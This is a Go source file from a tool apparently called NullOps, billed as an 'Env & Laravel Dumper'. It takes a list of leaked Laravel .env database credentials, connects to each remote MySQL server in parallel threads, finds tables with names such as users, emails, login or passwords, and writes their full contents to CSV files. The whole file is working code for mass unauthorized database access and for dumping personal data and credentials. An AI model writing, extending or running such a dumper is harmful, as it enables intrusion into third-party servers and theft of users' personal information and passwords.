package Dumpers

import (
	"NullOps/CLI_Handlers"
	"NullOps/Helpers"
	"NullOps/Interface"
	"database/sql"
	"encoding/csv"
	"fmt"
	_ "github.com/go-sql-driver/mysql"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"
)

var mu sync.Mutex

var (
	Dumped            = 0
	Failed            = 0
	Empty             = 0
	Targetable_Tables = 0
	checked           = 0
	total             = 0
)

func LaravelnEnvDumper() {
	Dumped, Failed, Empty, Targetable_Tables, checked, total = 0, 0, 0, 0, 0, 0
	Helpers.Running = true
	Interface.Clear()

	FilePath := CLI_Handlers.GetFilePath()
	urls, err := CLI_Handlers.ReadLines(FilePath)
	CLI_Handlers.LogError(err)

	defer func() {
		Helpers.Running = false
	}()

	threadCount := 10
	Interface.Option("?", "Threads")
	Interface.Input()
	_, err = fmt.Scanln(&threadCount)
	CLI_Handlers.LogError(err)

	Interface.Clear()
	Interface.Gradient("Env & Laravel Dumper By Visage (NullOps)")

	go func() {
		if Helpers.Running == true {
			Interface.DumperTitle("NullOps", Dumped, Failed, Empty, checked, total)
			time.Sleep(1 * time.Second)
		} else {
			return
		}
	}()
	defer func() {
		Helpers.Running = false
	}()

	Helpers.Threading(func(s string) {
		PMADump(s)
		mu.Lock()
		Helpers.Checked++
		mu.Unlock()
	}, threadCount, urls)
}

func PMADump(connectionString string) {
	checked++
	connectionParams := make(map[string]string)
	pairs := strings.Split(connectionString, "|")
	for _, pair := range pairs {
		parts := strings.Split(pair, "=")
		if len(parts) == 2 {
			key := strings.TrimSpace(parts[0])
			value := strings.TrimSpace(parts[1])
			connectionParams[key] = value
		}
	}

	dbHost := connectionParams["DB_HOST"]
	dbPort := connectionParams["DB_PORT"]
	dbUsername := connectionParams["DB_USERNAME"]
	dbPassword := connectionParams["DB_PASSWORD"]
	dbDatabase := connectionParams["DB_DATABASE"]

	dsn := fmt.Sprintf("%s:%s@tcp(%s:%s)/%s", dbUsername, dbPassword, dbHost, dbPort, dbDatabase)

	db, err := sql.Open("mysql", dsn)
	if err != nil {
		Failed++
	}
	defer db.Close()

	err = db.Ping()
	if err != nil {
		Failed++
	}

	tables, err := getTableNames(db)
	if err != nil {
		Failed++
	}

	TotalLinecount := 0
	foundKeyword := ""
	for _, tableName := range tables {
		keywords := []string{
			"email", "emails", "mail", "mails", "user", "users", "username", "usernames",
			"pseudo", "user", "users", "member", "members", "customer",
			"customers", "login", "signin", "password", "passwords", "pass", "pwd", "pw", "pws", "passwort",
		}

		isKeyword := false
		for _, keyword := range keywords {
			if tableName == keyword {
				Targetable_Tables++
				foundKeyword = keyword
				isKeyword = true
				break
			}
		}

		if isKeyword {
			lineCount, err := downloadTableData(db, tableName, dbHost)
			if err != nil {
				Failed++
			} else {
				TotalLinecount += lineCount
			}
		}
	}

	if TotalLinecount != 0 {
		Dumped++
		Interface.Valid(fmt.Sprintf("Url: %v | Dumped Lines: %v | Table Targeted: %v", dbHost, TotalLinecount, foundKeyword))
	} else {
		Empty++
	}
}

func getTableNames(db *sql.DB) ([]string, error) {
	query := "SHOW TABLES"
	rows, err := db.Query(query)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var tables []string
	for rows.Next() {
		var tableName string
		err := rows.Scan(&tableName)
		if err != nil {
			return nil, err
		}
		tables = append(tables, tableName)
	}

	if err := rows.Err(); err != nil {
		return nil, err
	}

	return tables, nil
}

func downloadTableData(db *sql.DB, tableName string, directory string) (int, error) {
	query := fmt.Sprintf("SELECT * FROM %s", tableName)
	rows, err := db.Query(query)
	if err != nil {
		return 0, err
	}
	defer rows.Close()

	columnNames, err := rows.Columns()
	if err != nil {
		return 0, err
	}

	values := make([]interface{}, len(columnNames))
	valuePtrs := make([]interface{}, len(columnNames))

	for i := range values {
		valuePtrs[i] = &values[i]
	}
	if err := os.MkdirAll(directory, os.ModePerm); err != nil {
		return 0, err
	}

	fileName := filepath.Join(directory, tableName+".csv")
	file, err := os.Create(fileName)
	if err != nil {
		return 0, err
	}
	defer file.Close()

	csvWriter := csv.NewWriter(file)
	defer csvWriter.Flush()

	if err := csvWriter.Write(columnNames); err != nil {
		return 0, err
	}

	lineCount := 0
	for rows.Next() {
		err := rows.Scan(valuePtrs...)
		if err != nil {
			return 0, err
		}

		rowData := make([]string, len(values))
		for i, v := range values {
			switch val := v.(type) {
			case []byte:
				rowData[i] = string(val)
			case int64:
				rowData[i] = strconv.FormatInt(val, 10)
			default:
				rowData[i] = fmt.Sprintf("%v", v)
			}
		}

		if err := csvWriter.Write(rowData); err != nil {
			return 0, err
		}

		lineCount++
	}

	return lineCount, nil
}
